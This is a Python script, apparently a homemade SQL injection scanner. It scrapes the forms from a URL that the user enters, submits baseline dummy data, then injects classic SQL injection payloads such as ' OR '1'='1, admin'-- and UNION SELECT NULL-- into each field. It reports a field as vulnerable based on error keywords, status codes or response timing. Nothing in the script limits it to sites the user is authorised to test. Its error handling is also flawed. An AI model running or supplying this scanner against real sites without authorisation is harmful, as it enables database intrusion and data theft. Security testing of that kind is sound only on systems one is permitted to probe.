import requests
from bs4 import BeautifulSoup

# global variables = [white list of all the injectable fields]
# response parameters = {res_time, content_length, }
# base_line_parameters = {base_line_time, base_line_length, etc}
# dummy_data = {username, password, email, age, a static dictionary with generic form fields data}

def get_forms():
    url = input("Enter the url: ")
    response = requests.get(url)
    form_text = response.text 
    return form_text


def parse_forms(text):
    """ Text refers to the text returned from the get_forms() function. """
    soup = BeautifulSoup(text, "html.parser")
    forms = soup.find_all("form")
    all_form_data = []
    for form in forms:
        action = form.get('action')
        method = form.get('method')
        form_field = []
        input_fields = form.find_all(['input', 'textarea'])
        for field in input_fields:
            input_data = {
                "name":field.get('name'),
                "required": field.has_attr('required'),
                "type": field.get('type'),
            }
            form_field.append(input_data)
        form_object = {
            "action": action,
            "method": method,
            "form_data": form_field
        }
        all_form_data.append(form_object)
    return all_form_data



# baseline response -> inject fields one at a time and compare the response with baseline response -> difference ? yes : no 
# function for the baseline dictionary generation
def base_response(text):
    # get the fields.
    parsed_fields = parse_forms(text)
    
    # assign data to fields.
    dummy_data = {
            "username":"admin", 
            "password":"administrator",
            "email":"test@gmail.com",
            "name":"john doe",
            "age": "24",
            "phone": "1234567890",
            "search":"test",
            "query": "test"
        }
    for form in parsed_fields:
        form_data_to_send = {}
        for field in form["form_data"]:
            field_name = field["name"]
            if field_name in dummy_data:
                form_data_to_send[field_name] = dummy_data[field_name]
            else:
                form_data_to_send[field_name] = "test_value@mail"
        try:
            response = requests.post(form["action"], data=form_data_to_send)
        except Exception as e:
            print(f"Error occured while making request : {e}")
        print(response)
        status_code = response.status_code
        response_time = response.elapsed.total_seconds()
        content_length_header = response.headers.get('Content-Length')
        extracted_info = [content_length_header, response_time, status_code]
        print(extracted_info)
        return extracted_info

def sql_injection(form_text):
    sql_payloads = ["'", "\" OR \"1\"=\"1", "' OR '1'='1", "1' UNION SELECT NULL--", "admin'--", "' OR 1=1--"]
    sql_error_keywords = ["sql", "syntax", "error", "mysql", "sqlite", "oracle", "postgresql", "query", "database"]
    
    parsed_fields = parse_forms(form_text)
    dummy_data = {
        "username":"admin", 
        "password":"administrator",
        "email":"test@gmail.com",
        "name":"john doe",
        "age": "24",
        "phone": "1234567890",
        "search":"test",
        "query": "test"
    }
    
    for form_index, form in enumerate(parsed_fields):
        baseline = base_response(form_text)
        baseline_status = baseline[2]
        baseline_time = baseline[1]
        baseline_length = baseline[0]
        
        for field in form["form_data"]:
            field_name = field["name"]
            
            for payload in sql_payloads:
                form_data_to_send = {}
                
                for f in form["form_data"]:
                    f_name = f["name"]
                    if f_name == field_name:
                        form_data_to_send[f_name] = payload
                    elif f_name in dummy_data:
                        form_data_to_send[f_name] = dummy_data[f_name]
                    else:
                        form_data_to_send[f_name] = "test_value"
                
                try:
                    response = requests.post(form["action"], data=form_data_to_send, timeout=5)
                    response_status = response.status_code
                    response_time = response.elapsed.total_seconds()
                    response_length = response.headers.get('Content-Length')
                    response_text = response.text.lower()
                    
                    has_sql_error = any(keyword in response_text for keyword in sql_error_keywords)
                    status_different = response_status != baseline_status
                    time_different = abs(response_time - baseline_time) > 1
                    
                    if has_sql_error or status_different or time_different:
                        print(f"\n[+] SQLI FOUND!")
                        print(f"    Form Index: {form_index}")
                        print(f"    Vulnerable Field: {field_name}")
                        print(f"    Payload: {payload}")
                        print(f"    Baseline Status: {baseline_status} | Response Status: {response_status}")
                        print(f"    Baseline Time: {baseline_time} | Response Time: {response_time}")
                        print(f"    SQL Error Keywords Found: {has_sql_error}")
                        
                except Exception as e:
                    print(f"Error testing {field_name} with payload {payload}: {e}")
